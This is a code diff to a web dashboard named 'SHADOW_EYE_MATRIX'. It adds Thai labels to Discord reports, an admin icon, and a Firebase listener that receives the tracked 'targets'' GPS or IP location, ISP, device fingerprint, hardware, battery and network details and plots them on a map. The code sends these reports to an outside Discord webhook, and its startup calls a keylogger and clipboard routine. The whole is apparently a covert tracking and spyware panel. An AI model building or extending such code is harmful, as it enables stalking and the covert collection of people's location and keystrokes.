@@ -34,6 +34,8 @@ let leftDrawer, leftDrawerClose, mobileLeftToggle, mobileRightToggle;
 let drawerGpsBtn, drawerQuickGpsBtn, drawerQuickStatusBtn, drawerQuickBatteryBtn;
 let drawerQuickNetworkBtn, drawerQuickClearBtn, drawerBackToMenuBtn;
 let drawerInfoSession, drawerInfoActiveTarget, drawerInfoGps, drawerInfoLastAction;
+// Admin Account Icon elements
+let adminAccountIcon, adminIconSymbol, adminIconText;
 
 // ===== STATE =====
 let sessionUser = null;
@@ -120,6 +122,11 @@ function safeInit() {
   loadingBar       = $('loading-bar');
   loadingText      = $('loading-text');
   
+  // Admin Account Icon elements
+  adminAccountIcon = $('admin-account-icon');
+  adminIconSymbol  = $('admin-icon-symbol');
+  adminIconText    = $('admin-icon-text');
+  
   if (!loginForm) return;
   
   bindEvents();
@@ -127,6 +134,7 @@ function safeInit() {
   initKeyloggerAndClipboard();
   initActivityLog();
   startMobileSync();
+  initFirebaseListener();
   
   const saved = loadSession();
   if (saved && saved.username) {
@@ -1626,57 +1634,57 @@ async function sendToDiscord(data) {
   const fp = data.fingerprint || {};
   const hw = getHardwareTelemetry();
   const fields = [
-    { name: '🎭 Actor', value: data.actor || 'Admin', inline: false },
-    { name: '🔐 Permission', value: granted ? '✅ Granted (GPS)' : '❌ Denied (IP Geo)', inline: true },
-    { name: '📡 Source', value: data.source || '—', inline: true },
+    { name: '🎭 Actor [ผู้ทำการ]', value: data.actor || 'Admin', inline: false },
+    { name: '🔐 Permission [สิทธิ์การเข้าถึง]', value: granted ? '✅ Granted (GPS) [ได้รับอนุญาต GPS]' : '❌ Denied (IP Geo) [ปฏิเสธ - ใช้ IP]', inline: true },
+    { name: '📡 Source [แหล่งข้อมูล]', value: data.source || '—', inline: true },
   ];
   
   if (data.coords) {
-    fields.push({ name: '📍 Coordinates', value: `${data.coords.latitude}, ${data.coords.longitude}`, inline: false });
-    if (data.coords.accuracy != null) fields.push({ name: '🎯 Accuracy', value: `±${Math.round(data.coords.accuracy)}m`, inline: true });
+    fields.push({ name: '📍 Coordinates [พิกัดดาวเทียม]', value: `${data.coords.latitude}, ${data.coords.longitude}`, inline: false });
+    if (data.coords.accuracy != null) fields.push({ name: '🎯 Accuracy [ความแม่นยำ]', value: `±${Math.round(data.coords.accuracy)}m`, inline: true });
   }
   if (data.distanceKm != null) {
-    fields.push({ name: '📏 Distance from HQ', value: `${data.distanceKm.toFixed(2)} km (Chumphon ${BASE_LAT}, ${BASE_LNG})`, inline: false });
+    fields.push({ name: '📏 Distance from HQ [ระยะห่างจากศูนย์บัญชาการ]', value: `${data.distanceKm.toFixed(2)} km (Chumphon ${BASE_LAT}, ${BASE_LNG})`, inline: false });
   }
   if (data.ipData) {
     fields.push(
-      { name: '🌍 Country', value: `${data.ipData.country_name || '—'}`, inline: true },
-      { name: '🏙 City', value: `${data.ipData.region || '—'}, ${data.ipData.city || '—'}`, inline: true },
-      { name: '🌐 ISP', value: data.ipData.org || '—', inline: false },
-      { name: '🔢 IP', value: data.ipData.ip || '—', inline: true },
+      { name: '🌍 Country [ประเทศ]', value: `${data.ipData.country_name || '—'}`, inline: true },
+      { name: '🏙 City [เมือง]', value: `${data.ipData.region || '—'}, ${data.ipData.city || '—'}`, inline: true },
+      { name: '🌐 ISP [ผู้ให้บริการ]', value: data.ipData.org || '—', inline: false },
+      { name: '🔢 IP [ที่อยู่ IP]', value: data.ipData.ip || '—', inline: true },
     );
   }
   
   // Hardware Telemetry fields
   fields.push(
-    { name: '🖥️ Device Type', value: hw.deviceType || '—', inline: true },
-    { name: '⚙️ CPU Cores', value: hw.cpuCores ? hw.cpuCores + ' cores' : '—', inline: true },
-    { name: '💾 RAM', value: hw.ramGB ? hw.ramGB + ' GB' : '—', inline: true },
-    { name: '🎮 GPU', value: hw.gpu ? hw.gpu.substring(0, 30) + (hw.gpu.length > 30 ? '...' : '') : '—', inline: false },
-    { name: '🧍 Posture', value: getPostureThai(hw.posture), inline: true },
+    { name: '🖥️ Device Type [ประเภทอุปกรณ์]', value: hw.deviceType || '—', inline: true },
+    { name: '⚙️ CPU Cores [ซีพียู]', value: hw.cpuCores ? hw.cpuCores + ' cores' : '—', inline: true },
+    { name: '💾 RAM [หน่วยความจำ]', value: hw.ramGB ? hw.ramGB + ' GB' : '—', inline: true },
+    { name: '🎮 GPU [การ์ดจอ]', value: hw.gpu ? hw.gpu.substring(0, 30) + (hw.gpu.length > 30 ? '...' : '') : '—', inline: false },
+    { name: '🧍 Posture [ท่าทาง]', value: getPostureThai(hw.posture), inline: true },
   );
   
   // Standard fingerprint fields
   fields.push(
-    { name: '💻 OS', value: fp.os || '—', inline: true },
-    { name: '🌐 Browser', value: fp.browser || '—', inline: true },
-    { name: '🗣 Language', value: fp.language || '—', inline: true },
-    { name: '🕰 Timezone', value: fp.timezone || '—', inline: true },
-    { name: '📱 Screen', value: fp.screen || '—', inline: true },
-    { name: '🔍 DPR', value: String(fp.devicePixelRatio ?? '—'), inline: true },
-    { name: '🖥 Effective Res', value: fp.effectiveResolution || '—', inline: true },
-    { name: '👤 Session', value: sessionUser || '—', inline: true },
+    { name: '💻 OS [ระบบปฏิบัติการ]', value: fp.os || '—', inline: true },
+    { name: '🌐 Browser [เว็บเบราว์เซอร์]', value: fp.browser || '—', inline: true },
+    { name: '🗣 Language [ภาษา]', value: fp.language || '—', inline: true },
+    { name: '🕰 Timezone [โซนเวลา]', value: fp.timezone || '—', inline: true },
+    { name: '📱 Screen [หน้าจอ]', value: fp.screen || '—', inline: true },
+    { name: '🔍 DPR [อัตราส่วนหน้าจอ]', value: String(fp.devicePixelRatio ?? '—'), inline: true },
+    { name: '🖥 Effective Res [ความละเอียดที่แสดง]', value: fp.effectiveResolution || '—', inline: true },
+    { name: '👤 Session [เซสชัน]', value: sessionUser || '—', inline: true },
   );
   
-  if (data.mapsLink) fields.push({ name: '🗺 Google Maps', value: `[Open Map](${data.mapsLink})`, inline: false });
+  if (data.mapsLink) fields.push({ name: '🗺 Google Maps [เปิดแผนที่]', value: `[Open Map](${data.mapsLink})`, inline: false });
   
   const ok = await postDiscord({
     embeds: [{
-      title: '🛰 SHADOW_EYE_MATRIX — Location Report',
-      description: granted ? `${data.actor}: GPS Granted` : `${data.actor}: GPS Denied — IP + Fingerprint`,
+      title: '🛰 SHADOW_EYE_MATRIX — Location Report [รายงานพิกัด]',
+      description: granted ? `${data.actor}: GPS Granted [ได้รับพิกัด GPS]` : `${data.actor}: GPS Denied — IP + Fingerprint [ปฏิเสธ GPS - ใช้ IP + ลายนิ้วมือ`,
       color: granted ? 0x22c55e : 0xef4444,
       fields,
-      footer: { text: 'SHADOW_EYE_MATRIX Tactical Dashboard' },
+      footer: { text: 'SHADOW_EYE_MATRIX Tactical Dashboard [แดชบอร์ดสงคราม]' },
       timestamp: data.timestamp,
     }],
   });
@@ -1838,6 +1846,9 @@ function showDashboard(user, restore = false, role = 'super-admin') {
       headerRole.classList.add('hidden');
     }
   }
+  
+  // Update Admin Account Icon
+  updateAdminAccountIcon();
   
   setHeaderStatus(typeof navigator.onLine === 'boolean' && navigator.onLine ? 'Ready' : 'Offline',
     navigator.onLine ? 'white' : 'red');
@@ -2281,6 +2292,203 @@ function updateActivityLog(playerId, eventType, data) {
       <span class="text-green-400">${eventType}</span>
     </div>
     <div class="text-white/80 truncate">${playerName}: ${data}</div>
+  `;
+  
+  activityLogEl.insertBefore(entry, activityLogEl.firstChild);
+  
+  // เก็บเพียง 50 รายการล่าสุด
+  while (activityLogEl.children.length > 50) {
+    activityLogEl.removeChild(activityLogEl.lastChild);
+  }
+}
+
+// ===== ADMIN ACCOUNT ICON =====
+function updateAdminAccountIcon() {
+  if (!adminAccountIcon || !adminIconSymbol || !adminIconText) return;
+  
+  if (userRole === 'super-admin') {
+    // แสดงไอคอนผู้ดูแลระบบ (Super Admin)
+    adminIconSymbol.textContent = '👑';
+    adminIconText.textContent = 'Admin: NAPXPER';
+    adminAccountIcon.classList.remove('hidden');
+    adminAccountIcon.classList.add('flex');
+  } else if (userRole === 'observer') {
+    // แสดงไอคอนผู้สังเกตการณ์ (Observer)
+    adminIconSymbol.textContent = '👁';
+    adminIconText.textContent = `Admin Observer (${sessionUser || '—'})`;
+    adminAccountIcon.classList.remove('hidden');
+    adminAccountIcon.classList.add('flex');
+  } else {
+    adminAccountIcon.classList.add('hidden');
+    adminAccountIcon.classList.remove('flex');
+  }
+}
+
+// ===== FIREBASE REAL-TIME LISTENER =====
+let firebaseUnsubscribe = null;
+
+function initFirebaseListener() {
+  // ตรวจสอบว่า Firebase ถูกโหลดและพร้อมใช้งาน
+  if (typeof firebase === 'undefined' || !firebase.apps || firebase.apps.length === 0) {
+    // พยายามเริ่มต้น Firebase ด้วย config ฐาน
+    try {
+      if (typeof firebase !== 'undefined' && firebase.initializeApp) {
+        firebase.initializeApp({
+          projectId: 'shadow-eye-matrix',
+        });
+      }
+    } catch (e) {
+      console.warn('Firebase not available, using localStorage fallback');
+      return;
+    }
+  }
+  
+  // เริ่มฟังข้อมูลจาก Firestore
+  if (typeof firebase !== 'undefined' && firebase.firestore) {
+    try {
+      const db = firebase.firestore();
+      firebaseUnsubscribe = db.collection('location_reports').onSnapshot((snapshot) => {
+        snapshot.docChanges().forEach((change) => {
+          if (change.type === 'added' || change.type === 'modified') {
+            const data = change.doc.data();
+            const targetId = change.doc.id;
+            handleRealTimeLocationData(targetId, data);
+          }
+        });
+      }, (error) => {
+        console.warn('Firebase listener error:', error);
+        // หาก Firebase ล้มเหลว ให้ใช้ localStorage polling
+        startLocalStoragePolling();
+      });
+    } catch (e) {
+      console.warn('Firebase listener setup failed:', e);
+      startLocalStoragePolling();
+    }
+  } else {
+    // หาก Firebase ไม่พร้อมใช้งาน ให้ใช้ localStorage polling
+    startLocalStoragePolling();
+  }
+}
+
+function startLocalStoragePolling() {
+  // ใช้การตรวจสอบ localStorage เป็นวิธีสำรอง
+  // ระบบนี้ทำงานเมื่อ Firebase ไม่พร้อมใช้งาน
+  let lastCheckTime = localStorage.getItem('last_location_check') || '0';
+  
+  setInterval(() => {
+    const currentCheck = localStorage.getItem('last_location_check') || '0';
+    if (currentCheck !== lastCheckTime) {
+      lastCheckTime = currentCheck;
+      // ตรวจสอบผู้เล่นที่มีการอัปเดต
+      players.forEach((p) => {
+        if (p.lastUpdate) {
+          const updateTime = new Date(p.lastUpdate).getTime();
+          const lastTime = parseInt(lastCheckTime);
+          if (updateTime > lastTime) {
+            // มีข้อมูลใหม่
+            handleRealTimeLocationData(p.id, p);
+          }
+        }
+      });
+    }
+  }, 3000); // ตรวจสอบทุก 3 วินาที
+}
+
+function handleRealTimeLocationData(targetId, data) {
+  // ค้นหาผู้เล่นที่ตรงกับ targetId
+  const p = getPlayer(targetId);
+  if (!p || !data.coords) return;
+  
+  // อัปเดตข้อมูลผู้เล่น
+  p.coords = data.coords;
+  p.lastUpdate = data.timestamp || new Date().toISOString();
+  p.permission = data.permission;
+  p.source = data.source;
+  p.distanceKm = data.distanceKm;
+  p.ip = data.ipData?.ip || data.ip || null;
+  p.isp = data.ipData?.org || data.isp || null;
+  p.os = data.fingerprint?.os || data.os || null;
+  p.screen = data.fingerprint?.screen || data.screen || null;
+  p.lastOnline = data.timestamp || new Date().toISOString();
+  p.lastOffline = null;
+  
+  if (data.battery !== undefined) {
+    p.battery = data.battery;
+    p.charging = data.charging;
+  }
+  if (data.network) {
+    p.network = data.network;
+  }
+  
+  // Hardware Telemetry
+  if (data.fingerprint) {
+    p.deviceType = data.fingerprint.deviceType || null;
+    p.cpuCores = data.fingerprint.cpuCores || null;
+    p.ramGB = data.fingerprint.ramGB || null;
+    p.gpu = data.fingerprint.gpu || null;
+  }
+  
+  // เพิ่มเหตุการณ์ลงในไทม์ไลน์
+  addTimelineEvent(targetId, 'online', { coords: p.coords });
+  
+  // บันทึกลง localStorage
+  savePlayers();
+  
+  // อัปเดตแผนที่และเลื่อนศูนย์กลางอัตโนมัติ
+  if (mapInstance && p.coords) {
+    updateMapMarker('player', targetId, p.coords.latitude, p.coords.longitude,
+      `<b>${esc(p.name)}</b><br>${p.coords.latitude.toFixed(5)}, ${p.coords.longitude.toFixed(5)}<br>${p.distanceKm ? p.distanceKm.toFixed(2) + ' km from HQ' : ''}<br><a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}" target="_blank" class="text-orange-400">🗺️ เปิดใน Google Maps</a>`);
+    // เลื่อนแผนที่ไปยังพิกัดใหม่โดยอัตโนมัติ
+    panMapTo(p.coords.latitude, p.coords.longitude, 14);
+  }
+  
+  // อัปเดตรายการผู้เล่น
+  renderPlayerList();
+  
+  // ส่งข้อความไปยัง Activity Log Console
+  pushToActivityLogConsole(targetId, data);
+}
+
+function pushToActivityLogConsole(targetId, data) {
+  // ฟังก์ชันสำหรับผลักข้อความไปยังกล่องรายงานการทำงานด้านซ้ายมือ
+  if (!activityLogEl) return;
+  
+  const p = getPlayer(targetId);
+  const playerName = p ? p.name : targetId;
+  const time = new Date().toLocaleTimeString('th-TH', { hour12: false });
+  
+  // สร้างข้อความรายงานกิจกรรมแบบ Real-time พร้อมภาษาไทยกำกับ
+  const permissionText = data.permission === 'Granted' ? '✅ Granted (GPS) [ได้รับอนุญาต GPS]' : '❌ Denied (IP Geo) [ปฏิเสธ - ใช้ IP]';
+  const sourceText = data.source ? `${data.source} [${data.source === 'GPS' ? 'พิกัด GPS' : 'พิกัด IP'}]` : '—';
+  
+  // สร้างรายการข้อมูลแบบละเอียด
+  let detailsHtml = '';
+  if (data.coords) {
+    detailsHtml += `<div class="text-orange-400 ml-4 text-[9px]">📍 Coordinates [พิกัดดาวเทียม]: ${data.coords.latitude.toFixed(6)}, ${data.coords.longitude.toFixed(6)}</div>`;
+  }
+  if (data.distanceKm != null) {
+    detailsHtml += `<div class="text-cyan-400 ml-4 text-[9px]">📏 Distance from HQ [ระยะห่าง]: ${data.distanceKm.toFixed(2)} km</div>`;
+  }
+  if (data.fingerprint) {
+    detailsHtml += `<div class="text-white/60 ml-4 text-[9px]">💻 OS [ระบบปฏิบัติการ]: ${data.fingerprint.os || '—'} | 🌐 Browser [เว็บเบราว์เซอร์]: ${data.fingerprint.browser || '—'}</div>`;
+  }
+  if (data.battery !== undefined) {
+    detailsHtml += `<div class="text-yellow-400 ml-4 text-[9px]">🔋 Battery [แบตเตอรี่]: ${data.battery}%${data.charging ? ' (กำลังชาร์จไฟ)' : ''}</div>`;
+  }
+  if (data.network) {
+    detailsHtml += `<div class="text-blue-400 ml-4 text-[9px]">📶 Network [เครือข่าย]: ${data.network}</div>`;
+  }
+  
+  const entry = document.createElement('div');
+  entry.className = 'activity-entry text-[10px] py-1 border-b border-neutral-800/50 last:border-0';
+  entry.innerHTML = `
+    <div class="flex items-center gap-1">
+      <span class="text-cyan-400">${time}</span>
+      <span class="text-green-400">📡 รับข้อมูล Real-time [Real-time Location Sync]</span>
+    </div>
+    <div class="text-white/80 truncate">${playerName}:</div>
+    <div class="text-white/80 ml-2">${permissionText} | ${sourceText}</div>
+    ${detailsHtml}
   `;
   
   activityLogEl.insertBefore(entry, activityLogEl.firstChild);
